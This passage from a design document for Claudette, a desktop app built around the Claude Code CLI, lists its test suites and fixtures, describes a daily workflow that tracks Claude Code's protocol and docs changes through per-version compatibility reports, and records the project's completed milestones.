| Protocol fixtures | `tests/Claudette.Core.Tests/Fixtures/protocol/2.1.284/`: `01`–`06` and `signed-out` from the spikes, `07`–`11` from `ProtocolRecordingTests`, and `12-subagents` recorded from the mock's `SUBAGENTS`. A later version's folder (`2.1.285/`, `2.1.286/`, `2.1.300/`, `2.1.308/`, `2.1.312/`) holds `ProtocolRecordingTests`' scenarios recorded again when its compatibility report is handled (`07`–`11`, and from 2.1.308 `12` and `13` too); the parsing and Diagnostics tests read every version's |
| Record mode | `tools/Claudette.Fixtures/` (`ProtocolFixtureWriter`: a protocol log to a cleaned fixture), used by `ProtocolRecordingTests` and `LiveTests` |
| `fake-claude` | `tools/Claudette.FakeClaude/`. Scripted by the prompt (`ASK_PERMISSION`, `SLOW`, `CRASH`, `SPAWN`, `SILENT`, `HANG`, `AUTH_FAIL`, `LIMIT`, `RUN_BASH`, `SUBAGENTS`) and by environment variables, rather than scenario files; see the header of its `Program.cs`. Its sign-in (`auth login`, `auth logout`, the sign-in control requests) is kept in a file in `CLAUDE_CONFIG_DIR`, so a sign-in sticks. Its reply to a message with images names their media types. |
| Mock Messages API | `tools/Claudette.MockApi/`. Runs in-process in tests, or on its own with `dotnet run`. |
| Screenshots on every system | `.github/workflows/screenshots.yml`, run from the Actions tab: on Windows, macOS and Linux (in a virtual display), `tools/Claudette.Demo/ci-screenshots.ps1` (PowerShell 7, or Windows PowerShell 5.1) runs the demo in each style and theme and keeps the main window (at 1920 by 1080 on every system, past the macOS runner's 1024-by-768 screen), Settings on Appearance and About Claudette, as Claudette draws them, as the run's artifacts: one set per system, to compare how it looks on each. It drives Claudette only through the command channel, naming windows by title, and has Claudette capture them ([Taking screenshots without the focus](#working-on-claudette)). |
| Demo content and the README's screenshots | `tools/Claudette.Demo/`: `claudette-demo` writes three game projects in git (Unreal in C++, Unity in C#, Godot) with Claude's changes, seven tabs with their transcripts and subagents' transcripts (among them a thread with two sub-threads, a plan and a task list part-way done), settings using `fake-claude`, and a plan usage history ending now (through `UsageStore`, with `fake-claude`'s `get_usage` answer to match). `screenshots.ps1` (Windows) runs the Debug build on it in each style and theme, finds controls through UI Automation, drives them through Claudette's command channel ([Taking screenshots without the focus](#working-on-claudette)), and captures with `PrintWindow` into `docs/screenshots/`: the window, Claudette on the composer close up (the demo's `--still` reduces motion, so she stands still for it), the diff view, the thread's Tasks page and agent map, and the detailed header; and it has `MascotPictureTests` draw her animation, `claudette.gif`. A folder it replaces must be empty or carry its marker file. |
| Tests against `fake-claude` and the real CLI | `tests/Claudette.IntegrationTests/`. The real-CLI tests are tagged `RealCli`. |
| View model tests | `tests/Claudette.App.Tests/`. `Support/TabTestHarness.cs` gives a tab a scripted Claude Code connection, a fake clock, a temporary data folder and a fake process tracker. |
| Rendered UI tests | `tests/Claudette.App.UiTests/`: Claudette's own views on Avalonia's headless platform, driven by keyboard and mouse, with the view model tests' harness (on Avalonia's dispatcher) and `*.verified.txt` snapshots (`UiText` turns a view into text). |
| Live suite | `LiveTests` in `tests/Claudette.IntegrationTests/`, tagged `Live` |
| Usage engine tests (parsers, store, burn rate, alerts, poller) | `tests/Claudette.Usage.Tests/`, with recorded `get_usage`, `rate_limit_event` and `/usage` fixtures |
| Process monitor tests | `tests/Claudette.Platform.Tests/`. Some start real process trees on the current OS; the Linux ones skip elsewhere. |
| History, library, leases, settings sync, diffs, git | `tests/Claudette.Core.Tests/{History,Library,Settings,Diffs,Git}`. Git tests use the real `git` in a temporary repo and skip without it. |
| Real-CLI checks of questions and plans | `RealCliTests`, with the mock's `ASK_QUESTION` and `EXIT_PLAN` scripts |
| Real-CLI checks of attachments, `@` mentions and slash commands | `RealCliTests`; the mock records the images that reach it, with a PNG's size |
| Hook callbacks | `HookCallbackTests` (protocol), `PerforceIntegrationTests` (`fake-claude`'s `RUN_BASH`), and `RealCliTests` against the real CLI |
| Perforce | A pretend `p4` (`tests/Claudette.Core.Tests/Support/FakeP4.cs`, also compiled into the App tests), `Perforce*Tests` in the Core and App tests, and a shell-script `p4` for a real pipe in `PerforceIntegrationTests`. Credential stores: `CredentialStoreTests`. |
| Real-CLI checks of subagents and stopping one | `RealCliTests`, with the mock's `SUBAGENTS` and `LONG_AGENT` scripts; the `12-subagents` fixture was recorded from `SUBAGENTS` |
| Subagents under the tab, and discouraging or refusing them | `SubagentMessagesTests` in Core, `SubagentTests` (scripted) and `SubagentRealCliTests` (the real CLI against the mock) in the app, `SubagentUiTests`, and `RealCliTests` for the hook on `Agent` and the note |
| Login shell environment | `LoginShellTests` in `tests/Claudette.Platform.Tests/LoginShell/`: reading the output, the terminal rule, timeouts and failures with a fake launcher and `FakeTimeProvider`, and real bash, dash, zsh and fish (each where installed) with a made-up `HOME`, never the user's rc files. `UserEnvironmentTests` in Core (the merge, waiting, and the callers) and `LoginShellSettingsTests` in the App tests. |
| Starting at login | `StartAtLoginTests` in the Core tests (which copy starts, the MSIX handover, turned off outside Claudette, tidying at launch) with `FakeLoginItems` (`tests/Claudette.Core.Tests/Support/`, also compiled into the App tests), and `LoginCommandTests`; `LoginItems/` in the Platform tests (the Run value in a test key of its own, on Windows only; the LaunchAgent and autostart files on every OS); `StartAtLoginTests` in the App tests (the switch and `--login`) and `StartAtLoginUiTests` (the minimized start). |
| Claudette on the composer | `MascotTests` and `MascotReactionsTests` in the App tests (what she does and when, over hours on `FakeTimeProvider` with a seeded `Random`, through `Support/MascotStage`; working with each tool, reacting to the tab, the user and her calendar; gravity; carrying), `MascotTabTests` (what the selected tab tells her, her lines, the settings), `MascotPictureTests` (the README's animation, from `Support/MascotPicture`) and `MascotUiTests` (standing on the box unclipped, riding it as it grows, keeping clear of the working line, ducking, clicks, carrying, her eyes, the bubble, the layer in front of the box). |
| Service status | `ServiceStatusTests` in the Core tests (the summary, levels and names, dismissals, which API errors count, the feed) and the App tests (the schedule with `FakeTimeProvider`, the banner, the setting), and `ServiceStatusUiTests`. The status page is `FakeHttpHandler` with a real summary from an incident, trimmed, in `tests/Claudette.Core.Tests/Fixtures/status/`. |

## 16. Tracking Claude Code Changes

Claude Code ships new versions often. Claudette depends on its command-line flags, output messages, control protocol, settings, file locations and command output, and some of these aren't documented. This section is the plan for catching changes before users do.

### The compatibility surface list

`compat/surface.yaml` in the repo lists every Claude Code item Claudette relies on, one entry each. Examples: `--input-format stream-json`, `rate_limit_event.rate_limit_info.utilization`, the exit codes of `claude auth status`, the `~/.claude/projects/` layout, the "Config install method" line of `claude doctor`.

Each entry records:

- The exact identifier, used to match against diffs.
- Where Claudette uses it (project and class).
- The doc page that describes it, or **undocumented**.
- The first Claude Code version that has it.
- The test that covers it.
- For undocumented items, the fallback if it breaks.

**Rule:** any code that starts using a new Claude Code item adds an entry in the same pull request. Code review checks this.

### What's watched

| Source | What it tells us | Where |
|---|---|---|
| New releases | A new version exists | npm release tags for `@anthropic-ai/claude-code` (`latest` and `stable`) |
| Changelog | What changed, in words | `CHANGELOG.md` in the `anthropics/claude-code` GitHub repo |
| Agent SDK types | The exact shape of every message, option and control method | `sdk.d.ts` in the `@anthropic-ai/claude-agent-sdk` npm package, compared between versions |
| Python Agent SDK source | The wire format of control messages, which isn't documented | The `anthropics/claude-agent-sdk-python` GitHub repo |
| Docs pages | Documented behavior | The Markdown version of each page Claudette depends on (add `.md` to the URL); `llms.txt` lists every page |
| The CLI itself | Flags, and actual output | `claude --help` and subcommand help, plus protocol output recorded against the mock model server ([§15](#real-cli-against-a-fake-model)) |

### Daily compatibility check

A scheduled GitHub Action (`.github/workflows/compat.yml`) runs once a day. It uses `compat/check.mjs`, a dependency-free Node script. When npm's `latest` tag shows a Claude Code version newer than `lastTested` in `compat/surface.yaml`, and there's no report for it yet, it:

1. **Collects:**
   - The changelog entries after `lastTested`.
   - The Agent SDK type definitions (`sdk.d.ts`) for both versions. It finds the SDK release for each CLI version through the `claudeCodeVersion` field in the SDK's npm metadata.
   - The docs pages listed in the surface file.
   - `claude --help` from the new version.
2. **Diffs:**
   - The SDK types between the two versions.
   - The docs pages and CLI help against the snapshots kept in `compat/docs/` and `compat/cli-help.txt`.
3. **Matches** the changelog and changed diff lines against the identifiers in `compat/surface.yaml`, as whole tokens, so changes to things Claudette uses are listed first.
4. **Tests** by installing that version and running the free test suite against it, including the real-CLI tests with the mock model.
5. **Reports** by opening a GitHub issue, *"Claude Code 2.1.285 compatibility report"*, labeled `compat`.
   - The issue shows test results first, then matched changes, then the full diffs in collapsed sections.
   - GitHub refuses an issue body over 65,536 characters, and a large docs change can match hundreds of identifiers with diffs running to megabytes. The issue's copy is cut to fit: each diff and the test log are shortened in turn, and the matched identifiers are all kept, their hits going first. A cut issue says so and links the run, whose `compat-report` artifact holds the whole report, the test output and the new CLI help.
   - If nothing matched and every test passed, the issue is closed automatically and kept as a record.

A tracked docs page that's gone (404 or 410), or that answers with HTML rather than Markdown, counts as a change: its diff shows the page replaced by a note saying so. A `docs` link in the surface file may point at a section of a page (`…/typescript#options`); the page is fetched once, without the fragment, since a URL's fragment never reaches the server and `typescript#options.md` would fetch the HTML page instead.

The same workflow runs the real-CLI tests against the **minimum** supported version (`minimum` in the surface file), on days when `main` changed in the last 25 hours (or when run by hand with *minimum* ticked). Claudette's own changes are what could stop it working with an older Claude Code, and checking once a day, rather than on every pull request, keeps CI minutes flat. Inputs reach its scripts through the environment, never pasted into them, and `GH_TOKEN` is given only to the steps that call `gh`.

A dry run against the two versions before 2.1.284 (`node compat/check.mjs report --from 2.1.281 --version 2.1.284`) flagged eight changes. One was a changelog line about `claude -p` startup; another was an Agent SDK doc comment change on `apply_flag_settings`.

The first real report, for 2.1.285 (#27), matched 47 changes, mostly docs rewrites and pages new to the snapshots. What it changed:

- `claude -p` now starts in auto mode on third-party providers and with telemetry off ([Starting mode](#starting-mode)). Claudette already asks for auto mode itself, so tabs start as before.
- `result` has five new timing fields (`process_turn_index` and `time_to_request_*`), now known to Diagnostics, and `system/init` can list a capability Claudette doesn't use.
- Nothing else in the protocol changed: the Agent SDK types only gained settings documentation and a `provider_not_allowed` startup failure. The real-CLI tests pass against 2.1.285.

The report for 2.1.286 matched 51 changes. What it changed:

- `claude auth status` now reports a Console sign-in's stored key as `api_key`, where 2.1.285 said `claude.ai`. Claudette already reads `api_key` as an API key: the account menu says so, its billing link goes to the Console, and Remote Control isn't offered ([§11](#11-sign-in), [§18](#remote-control-the-claude-app)).
- A policy turning Remote Control off now disconnects the session, with `worker_shutting_down` and the reason `remote_control_disabled`. The tab says Remote Control isn't available, and no tab tries again until Claudette restarts or another account signs in.
- The recorded scenarios (`07`–`11`, in `2.1.286/`) are otherwise the same. In them 2.1.286 sent no `autocompact_state`, `rate_limit_event`, `active_goal` or `commands_changed`, `result` lost 2.1.285's timing fields, and `system/init` gained `memory_paths` and the capabilities `sdk_mcp_tools_list_changed`, `sdk_mcp_manifests` and `ui_surface_v1`. Claudette needs none of them. The subagent hand-back frame, `api_retry`'s attempt counts and the real-CLI tests are unchanged.

The report for 2.1.300 (#48) matched 113 changes across fourteen releases, nearly all docs rewording and fixes. What it changed:

- Two new startup failures, `org_config_required_unavailable` and `org_config_refused` (an organization's required policy that couldn't be loaded, or was refused for the sign-in), are put in words like the others ([§4](#4-tabs--sessions), "Why it couldn't start").
- `resume_reason` also marks a turn Claude Code goes on with after a restart, from its tool calls or a permission prompt, not only one it runs again. The note Claudette adds fits both.
- New fields Claudette doesn't read, now known to Diagnostics: `run_id` on task messages (one per run of a task; a resumed subagent keeps its `task_id`), `parent_task_id` on `task_started`, `agent_id` on a subagent's `assistant` and `user` messages, `api_message_id` on every `stream_event` and `safety_stops` on `result`. The `initialize` response adds `claude_code_version`, and `system/init` the capabilities `interrupt_send_now_v1` and `request_marker_lists_v1`.
- In the recorded scenarios (`07`–`11`, in `2.1.300/`), an interrupted reply now ends with its `content_block_stop`, `message_delta` and `message_stop`, after the assistant message; Claudette reads only the deltas from stream events, so nothing changes. The real-CLI tests pass against 2.1.300.
- Not used yet: the `get_task_output` control request (the last 8 KiB of a background shell's or Monitor's output), `tool_use_result`'s `{ detachedToolCall: true }` for a WebFetch or WebSearch that steps aside for a message sent with priority `now` (Claudette doesn't send one), and `claude project purge`, now `claude purge`.

The report for 2.1.308 (#57) matched 100 changes across eight releases, nearly all docs rewording and fixes. What it changed:

- Claude Code now holds some tools back until the model loads them with `ToolSearch`: in plan mode `ExitPlanMode`, and `SendMessage`, the task tools, `NotebookEdit`, `WebFetch`, `WebSearch` and the cron and worktree tools. A model loads one and calls it as before, so a plan's card and a thread's messages arrive as they did; the `ToolSearch` call is an ordinary tool row. The mock API's scripts now load a held-back tool first, as a model does, which the two plan-approval real-CLI tests had been waiting on (`ToolSearch` and the deferred tools' reminder in the surface file).
- In the recorded scenarios (`07`–`11`, in `2.1.308/`), `system/init` adds `original_cwd` and `additional_directories`, now known to Diagnostics, and the capabilities `interrupt_requeue_taken_v1`, `lifecycle_wakeup_source_v1` and `mcp_call_result_not_for_model_v1`. Nothing else changed, and the real-CLI tests pass against 2.1.308 and 2.1.301.
- The report's other two failures weren't Claude Code's: a Project Files test that passes on every run elsewhere, and the Linux process monitor's measure of a busy process's CPU, which a busy CI runner can upset.
- Not used yet: the Agent SDK's `BUILTIN_TOOL_NAMES` and `LEGACY_TOOL_NAME_ALIASES` (alpha), and a per-tool permission policy for an SDK MCP server's tools.

The report for 2.1.312 (#91) matched 154 changes across four releases, but most were the docs pages' links becoming absolute; without those, 55 matched, nearly all docs rewording and fixes. What it changed:

- Claude Code's limit messages now call the session limit the "5-hour limit". Claudette finds a limit from `rate_limit_event`'s fields, not from the message, so nothing breaks, and its own notices keep the usage header's name, *session limit*, as claude.ai's usage page does.
- In the recorded scenarios (`07`–`13`, in `2.1.312/`), `system/init` adds the capability `ask_user_question_unanswered_v1`, and `result` adds `model_usage_since_last_result` (each model's usage since the previous result, which the Agent SDK's types don't list), now known to Diagnostics. Below the top level, `modelUsage` adds the 5-minute and 1-hour cache writes, an interrupted reply's `message_stop` names the blocks it abandoned (`abandoned_blocks`), a subagent's `tool_use_result` adds `toolsUsed`, and a reply's `message_delta` stream event now comes before the `task_started` or tool result it used to follow. Claudette reads none of them, and the real-CLI tests pass against 2.1.312 and 2.1.301.
- Unchanged for Claudette: model ids drop a `[1m]` suffix where it does nothing (Claudette compares ids without it); `stream-json` writes some control and format characters as `\uXXXX` escapes, which parse to the same values; and a restart's carried-on turn still leaves out the tool calls the restart cut off, which `CLAUDE_CODE_RESUME_SHOWS_CUT_OFF_CALLS` (2.1.309) would keep, marked as cut off.
- Compacting asks the model for its summary in a `<summary>` block, and from 2.1.311 asks once more when the reply has none. The mock API answered every request it didn't know with "pong", so each compaction made two calls and the recorded compaction counted twice what it had. The mock now answers that request with a summary, as a model does (`<summary> block` in the surface file); Claudette's own counting was right either way.
- The report's one failure wasn't Claude Code's: a missing-folder test started a close from the test's own thread, so its wait could read the tabs while the close was taking one away. It now starts the close as a click does. The tests of Claude Code's projects in the sidebar had the same race, restoring from the test's thread, so a wait could find a group before its past sessions; they now restore as the app does.
- Not used yet: `ask_user_question_unanswered_v1` (an answer can say a question was skipped, answered in the chat or dismissed), `model_usage_since_last_result` (Claudette works a turn's usage out from the running `modelUsage` totals), `mcp_status`'s `liveReply`, and the `mcpMount` permission rule source.

### Tested versions

- Claudette records two versions:
  - `ClaudeLocator.MinimumVersion` (`minimum` in `compat/surface.yaml`): the hard floor from [§12](#applying-it).
  - `ClaudeLocator.LastTestedVersion` (`lastTested`): updated each time a compatibility report is handled.
- A version newer than the last tested one is allowed. Settings → Claude Code shows a quiet note, *"Newer than the last tested version (2.1.312)"*, and nothing more intrusive.
- A version older than the last tested one, but not older than the minimum, is supported too, with a nudge to update and nothing that blocks:
  - Settings → Claude Code adds *"Older than the last tested version (2.1.312); updating is recommended"*.
  - When the update badge offers a newer version ([§12](#applying-it)), its dialog adds *"Claudette was last tested with 2.1.312."*
  - Only the minimum is required. It goes up only when Claudette starts relying on something a newer version adds, not with each compatibility report.

### Staying tolerant at runtime

Claudette has to keep working when Claude Code adds things it doesn't know about yet:

- Unknown fields are ignored. Unknown message types are skipped and counted. An unknown enum value (for example a new error category) is handled like `unknown`.
- Types Claudette has seen and has no use for are skipped without being counted, so Diagnostics only shows what's new: `active_goal` in 2.1.284. Each is listed in `compat/surface.yaml`.
- A line that fails to parse never ends a session. It's logged, and Claudette moves on.
- With protocol logging on, a skipped message appears in the conversation as a collapsed *"Unsupported message from Claude Code"* row that shows the raw JSON.
- Features are detected with the `capabilities` list from `system/init`, not by comparing version numbers.
- Settings → Advanced has a **Diagnostics** page. It shows the Claude Code version, counts of unknown messages and fields seen, whether the login shell's environment was used ([§13](#login-shell-environment)), and whether the computer is being kept awake for tabs connected to the Claude app, or why not ([§18](#remote-control-the-claude-app)), and has **Copy diagnostics** for bug reports.

### Handling a report

1. Read the matched changes and any failing tests. To see exactly what changed in the protocol, re-run the relevant scenario in [`spikes/`](spikes/README.md).
2. Update the code, `compat/surface.yaml` and the protocol fixtures.
3. Bump `lastTested` in `compat/surface.yaml` and `ClaudeLocator.LastTestedVersion` together; a unit test checks they match.
4. Refresh the snapshots: `node compat/check.mjs update-snapshots --help-file <output of claude --help>`.
5. If the change breaks a released Claudette version, ship a patch release. Raise `minimum` (and `ClaudeLocator.MinimumVersion`) only if older Claude Code versions can no longer be supported.

## 17. Milestones

1. **Skeleton.** ✅ Built 2026-09-28.
   - **Scope:**
     - Avalonia app, Claude Code detection and version check, sign-in.
     - One tab: launch `claude`, send a prompt, stream the reply as Markdown, basic Allow/Deny permission cards, Stop.
     - Status bar with model, mode and context window %.
     - Test harness: fake transport, `fake-claude`, mock model server, first protocol fixtures and CI.
     - `compat/surface.yaml` and the daily compatibility check.
     - The utility session.
   - **Still to verify:** completing an in-app sign-in (the `claude_oauth_*` requests), which needs a real sign-in into a throwaway config.
   - The spikes were done on 2026-09-28. Their findings are recorded in the sections they affected; the scripts are in [`spikes/`](spikes/README.md).
2. **Tool rendering.** ✅ Built 2026-09-28.
   - Tool rows with status dots, expandable to full input and output.
   - Inline Edit and Write diffs from `structuredPatch`, and Bash command and output.
   - Collapsed thinking.
   - Subagents as nested groups, routed by `parent_tool_use_id`.
   - The pinned to-do list, for both `TodoWrite` and the Task tools.
   - A single retry note that updates in place, a summary after each turn, "Jump to latest", and clearing on `/clear`.
3. **Tabs & settings.** ✅ Built 2026-09-28.
   - **Tabs:** multiple tabs grouped by folder, with group colors, collapse and close. The new-tab picker has search, favorites and recents.
   - **Tab details:** status icons, AI titles with the first-prompt fallback, rename, pin, and the tab info card.
   - **Session controls:** model and effort pickers, with confirmation before a model switch, and token stats with a breakdown.
   - **Persistence:** restore on launch, lazy start, and the earlier conversation reloaded from the transcript.
   - **Settings:** the Settings window for the current categories, and per-tab overrides.
   - **Composer:** check-ins and quick suffixes.
   - **Keyboard shortcuts** for tabs and settings.
   - **Deferred to later milestones:**
     - Dragging tabs to reorder, the Settings search box, and per-suffix shortcuts and number keys in the suffix menu: built in milestone 7.
     - The "this session window" token split, which needs milestone 5's usage data.
     - OS notifications for check-ins: built in milestone 7.
4. **Permissions.** ✅ Built 2026-09-28.
   - **Prompts:** inline prompts with the tool's input and a diff preview for edits.
     - **Always allow…** shows the exact rule and lets you edit it; the menu offers **Allow for this session only**.
     - Mode suggestions (accept edits), and **Deny with a message**.
     - `defaultToNo` and `suppressAlwaysAllowRule` are respected.
   - **Questions and plans:** cards for clarifying questions (`AskUserQuestion`) and plan approval (`ExitPlanMode`), both confirmed against the real CLI.
   - **Mode picker:** the permission mode picker, with a confirmation and warning style for Bypass.
   - **Keyboard and notes:** Ctrl/Cmd+Enter and Ctrl/Cmd+Backspace answer prompts, and notes appear for denials Claude Code made by itself.
   - **Deferred:**
     - The OS notification for a waiting prompt: built in milestone 7.
     - Switching into Bypass mid-session works only for tabs started in Bypass mode ([§7](#7-permission-prompts)).
5. **Usage.** ✅ Built 2026-09-28.
   - **Header:** meters, countdowns and the sparkline with projection.
   - **Polling:** `get_usage` through the utility session, plus `rate_limit_event` updates and the `/usage` fallback.
   - **History and panel:** the SQLite usage history with retention and **Clear usage history**, and the Usage panel.
   - **Alerts:** shown in the header.
   - **Per tab:** each tab's "this session window" tokens and per-turn chart, and **Compact**.
   - **Deferred:** OS notifications for alerts, built in milestone 7.
6. **History, sync & diffs.** ✅ Built 2026-09-28.
   - **History:** History (Ctrl/Cmd+Shift+H, or from the new-tab picker).
   - **Session library:**
     - Copies after each turn, leases with take-over and **Open a copy**, and conflict copies.
     - Restoring on another machine, with project identity and the code check.
     - Retention, **Move library…**, the cloud-folder warning, and settings sync.
   - **Changed files:** the Changed files panel (session edits, or working tree vs HEAD), the built-in diff view with syntax highlighting, and external diff tools with presets, a custom command and **Test**.
   - **Processes:** the process monitor, and stopping a tab's processes when it closes.
   - **Deferred:**
     - The per-tab switch for the process monitor: built 2026-09-29.
     - Running the process code for real: done on Linux 2026-09-29, in CI's Ubuntu job too. macOS still needs a Mac; its code compiles and its `ps` parsing is tested.
     - Resuming a transcript recorded on the other OS ([§9](#session-library-sync-across-machines)).
     - **Choose folder…** and **Unpin and close** for a restored tab whose folder is gone: built 2026-09-29.
7. **Polish & ship.** ✅ Built 2026-09-29.
   - **Claude Code updates ([§12](#12-claude-code-updates)):**
     - Checks with `claude --version`, `claude doctor` and Homebrew or WinGet, at launch and every 4 hours.
     - The update badge and its dialog, **Update now** for each install method, and **Update on next launch** for WinGet.
     - The tab note for an older version, and **Update now** on the too-old setup screen.
   - **Notifications ([§10](#10-notifications)):** every type, with its setting, click routing and the Dock/taskbar badge, on Windows, macOS and Linux.
   - **Keyboard ([§14](#keyboard-shortcuts)):** Settings → Keyboard with rebindable, synced shortcuts, per-suffix shortcuts, and 1–9 in the suffix menu.
   - **Settings:** the search box, and the Notifications and Keyboard categories.
   - **Platform chrome ([§2](#2-platform--tech-stack), [§4](#opening-a-tab)):**
     - Mica on Windows 11.
     - The macOS menu bar (Settings…, File with Open Recent) and Dock menu, and the Windows jump list.
     - One running instance, which takes later launches' `--folder`.
     - Folders dropped on the sidebar open tabs.
     - Dragging tabs and groups.
   - **Sidebar ([§4](#sidebar)):** the tab strip was replaced by a sidebar on the left, which collapses to a rail (by hand, and in narrow windows), can be resized, and holds History, the update badge and Settings at its foot.
   - **Packaging ([§2](#packaging-and-signing)):** MSIX, and a signed, notarized `.dmg`, built by `package.yml`, with a placeholder icon.
   - **Still to verify on real machines** (CI builds and runs the platform tests on Windows and macOS, but nothing there is looked at or clicked):
     - Showing and clicking toasts and macOS notifications, and both badges.
     - Mica, the jump list, and the macOS menus and Dock menu.
     - Homebrew and WinGet updates.
     - Installing the MSIX and `.dmg`, and signing and notarization, which need the certificates.
   - **Deferred:**
     - A macOS-style theme ([§2](#2-platform--tech-stack)). macOS uses the Fluent theme for now; this needs a design decision.
     - The replacement for the placeholder icon: done 2026-09-29 ([§2](#packaging-and-signing)).
8. **Working on Claudette.** ✅ Built 2026-09-29. A source build runs from a copy of its build output, notices new builds, and restarts into them with every tab, draft and the window as they were, taking its tabs back if the new build doesn't start ([§9](#working-on-claudette)). Checked end to end on Linux under Xvfb: rebuilding while it ran, the automatic restart, and a broken build being refused.
   - **Still to verify on Windows:** rebuilding while a copy runs, which is what the copy is for, and starting the new build from Explorer and from `dotnet run`.
9. **Filling the gaps.** ✅ Built 2026-09-29. What an audit of §2–§16 found still missing:
   - **Sign-in ([§11](#11-sign-in)):** the banner across the tabs mid-session, messages held while signed out and delivered after, resuming failed tabs, a start that fails for a sign-in, **More options** (Console account, SSO), the `claude auth login` fallback, **Try again**, the header's account menu with **Sign out…**, and Sign in / Sign out in Settings → Claude Code.
   - **Composer ([§5](#5-conversation-view)):** `/` and `@` autocomplete, attaching images and files (drop, paste, the attach button) with thumbnails on sent and restored messages, tool icons on tool cards, and **Open diff** on Edit and Write cards.
   - **Tabs ([§4](#4-tabs--sessions)):** a failed tab's row shows its error, a tab whose check-ins go unanswered says *Possibly stuck*, and the info card shows when the session started.
   - **Usage and context ([§6](#6-token-burn-awareness)):** tokens count up during a turn from per-call usage, the context indicator is estimated when `get_context_usage` isn't available, and the Usage panel lists every past session and week.
   - **Sessions ([§9](#9-sessions-history-restore--sync)):** a restored tab whose transcript is gone offers a new session, leases are taken on open and checked for sessions on this machine too, session records keep per-tab overrides, and History searches every prompt.
   - **Settings ([§14](#14-settings)):** **Reset to defaults** everywhere, favorite folders, fonts for the conversation and code, the overrides dot, model and effort lists from Claude Code, and the window's place and size remembered.
   - **Remembered on this machine:** a dismissed update badge and the once-per-version update notification ([§12](#applying-it)).
   - **Diagnostics ([§13](#13-architecture), [§16](#staying-tolerant-at-runtime)):** protocol logging with **Open log folder**, the Diagnostics page with **Copy diagnostics**, and skipped messages shown in the conversation while logging.
   - **Testing ([§15](#15-testing)):** rendered UI tests with Verify snapshots, record mode and fixtures for a denied permission, an interrupt, `/clear`, compaction and API retries, the Live suite (built, not run), and `fake-claude` child processes, quiet and hung turns, sign-in and `get_usage`.
   - **Still to verify:** a real sign-in through both paths with a throwaway account; pasting and dropping from Finder, Explorer and screenshot tools; running the Live suite with a spend-limited key.
10. **Perforce.** ✅ Built 2026-09-29. Ticket handling and the changelist in the tab title ([§18](#18-future-features)), with hook callbacks through `initialize` (confirmed against 2.1.284, [§13](#integration-with-claude-code)) and the OS credential stores.
    - **Still to verify:** a real Perforce server (including SSO and multi-factor), P4V, and the Windows and macOS credential stores in the running app.
11. **Agent map.** ✅ Built 2026-09-29 ([§18](#agent-map)): the Agents page of the side panel and its own window, with live status, activity, running time, tool calls and tokens for each subagent, the prompt it was given and the report it returned, clicking through to its group or its waiting prompt, Stop for one subagent through `stop_task`, the info card's Agents row, and restored tabs replaying the finished tree from the subagents' own transcripts.
    - **Still to verify:** clicking through it in a real window, and `subagent_retry` against real API errors.
12. **Updates, syncing by choice, and the working line.** ✅ Built 2026-09-29.
    - **Updating Claudette ([§2](#updating-claudette)).** An installed Claudette checks its GitHub releases, downloads the package for its platform, checks it, and restarts into it with every tab as it was, through the source builds' handover. Settings → General has the version, the checks and pre-releases.
    - **Per-tab sync ([§9](#session-library-sync-across-machines)).** Syncing to the session library is opt-in per tab: **Sync to other machines** in the tab menu and **Tab settings…**, a sync icon on the tab's row, and **Sync new tabs to the session library** in Settings → Sessions (off by default). Sessions opened from the library keep syncing; a tab that doesn't sync writes nothing to the library and ignores leases.
    - **Working line ([§5](#working-line)).** A twinkling glyph, a fun verb (or what the running tool is doing), the turn's time and tokens above the composer while Claude works, with Claude Code's `spinnerVerbs`, and both options in Settings → Conversation.
    - **Login shell environment ([§13](#login-shell-environment)).** On macOS and Linux, a Claudette not started from a terminal reads the login shell's environment once in the background, and `claude`, git, `p4`, diff tools and Homebrew start with it merged in. **Use my login shell's environment** in Settings → Claude Code (on by default), and a Diagnostics line saying which shell was used, or why not.
    - **The Claude style ([§3](#visual-style)).** Settings → Appearance → Style: Standard (the default) or Claude, the Claude apps' look: their ivory, warm greys and orange, your messages in bubbles on the right, serif replies, a big rounded composer with a round Send arrow, in light and dark, switching without a restart. Code blocks and inline code now follow the light or dark theme in both styles (they were always dark).
      - **Still to verify:** how it looks on a real Windows, macOS and Linux desktop, and next to the Claude iOS app. It has only been rendered headlessly so far.
    - **Version ([§14](#version)).** The foot of the Settings sidebar shows Claudette's version (0.1.0, the first release), with the commit for a source build; clicking it copies the versions for a bug report, and **Report an issue** opens a new GitHub issue with them filled in.
    - **Detailed header ([§6](#detailed-header)).** The header's chevron, or **Detailed usage header** in Settings → Usage, draws the header taller: charts of the session and the week with the thresholds, projections and a mark where the session crosses the critical threshold, the burn rate, the time to the limit and the busiest tabs. Remembered on this machine.
      - **Still to verify:** how it looks on real screens. So far it has only been rendered headlessly (Skia, light and dark, at several widths). Check it on Windows with Mica, on macOS, on high-DPI displays and with other accent colors.
    - **Conversation and sidebar polish.**
      - A context ring on each tab's row, with **Show context** for tab rows in Settings → Conversation ([§4](#sidebar), [§6](#per-tab-context)).
      - **Copy** on code blocks, user messages and replies, and each message's time on hover, from the clock live and from the transcript when restored ([§5](#copy-and-times)).
      - **Density** in Settings → Appearance: Comfortable or Compact ([§14](#pages)).
    - **Still to verify:** installing an update on a real Windows and Mac, which needs signed packages from a published release; the login shell's environment in a Claudette started from the Dock on macOS and from a desktop launcher on Linux.
13. **Project tools.** ✅ Built 2026-09-29 ([§18](#project-tools)).
    - **Unreal Engine:** finding the project (in the folder, below and above it) and its engine (a parent folder, `LauncherInstalled.dat`, the registry, `Install.ini`, a chosen folder), Launch editor with Development or DebugGame per project, Generate project files, Build editor, Build and launch, Open solution with a chosen IDE (Open in Rider, with the `.uproject`, for Rider), Open latest log, Clean intermediates and End all Unreal editors.
    - **Unity:** the editor for the project's version from Unity Hub's folders and lists, Open in Unity with Release or Debug code optimization, EditMode tests with their counts, regenerating the C# solution, the solution and logs, Clean Library, End all Unity editors, and the lock file rules.
    - **Godot:** finding the executable (a pick, Settings, the `PATH`, `Godot.app`, Scoop and WinGet) and checking for the .NET build, Open in Godot, Run project, Build C#, Open solution, Clean `.godot` or `.import`, and End all Godot editors.
    - **The chip** in the composer bar (since moved to the sidebar's foot, milestone 15, then to each group's row), the project's submenu in the tab menu (since removed, milestone 15), the **Project** page with the job's output and Stop, the notification, and `Ctrl/Cmd+Shift+E`.
    - **Runs in the sidebar:** each job gets an entry under its tab's row with its own log, which stays until it's closed, with Stop while it runs.
    - **claudette.json** and **claudette.local.json:** a folder's own actions (shared ones run on a click, without a confirmation) and links, the links in the sidebar (since moved into the project's menu, milestone 15), and the in-app editor.
    - **Settings → Project tools**, and the notes to Claude about Unreal, Unity and Godot projects.
